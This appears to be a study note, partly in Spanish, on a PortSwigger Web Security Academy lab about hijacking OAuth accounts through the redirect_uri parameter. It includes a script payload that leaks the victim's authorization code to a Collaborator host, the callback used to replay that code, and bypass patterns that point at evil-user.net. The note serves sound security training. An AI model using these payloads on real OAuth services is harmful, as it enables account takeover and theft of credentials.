---
title: "4 - OAuth account hijacking via redirect_uri"
---

# 4 - OAuth account hijacking via redirect_uri

**Authorization Code Grant Type** (response_type=code) :

```HTTP
GET /auth?client_id=q915ketoagt2nasucjbc7&redirect_uri=https://0a6200be04527b9f81c02a56008c00bc.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
```

```html
<script>
document.location='https://oauth-0a9e00d304bba001811b1e81021400b7.oauth-server.net/auth?client_id=pujzm6j861iwqutbz7nrj&redirect_uri=https://zx08szy8tkdvaqlhl1o24stao1uwin8bx.oastify.com/oauth-callback&response_type=code&scope=openid%20profile%20email'
</script>
```

Luego accederíamos al callback real con el código que nos llega en el collaborator :

```
https://0a9f002b0421a04d81742009007e006d.web-security-academy.net/oauth-callback?code=fSRO55naPkbCcfCk0vXiGvegFS19e2CHPHZZh-qX_y9
```

[OAuth 2.0 authentication vulnerabilities | Web Security Academy](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens)


- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
- If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:
    
    `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
    
    If you're not familiar with these techniques, we recommend reading our content on how to [circumvent common SSRF defences](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses) and [CORS](https://portswigger.net/web-security/cors#errors-parsing-origin-headers).
    
- You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows:
    
    `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
- Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.
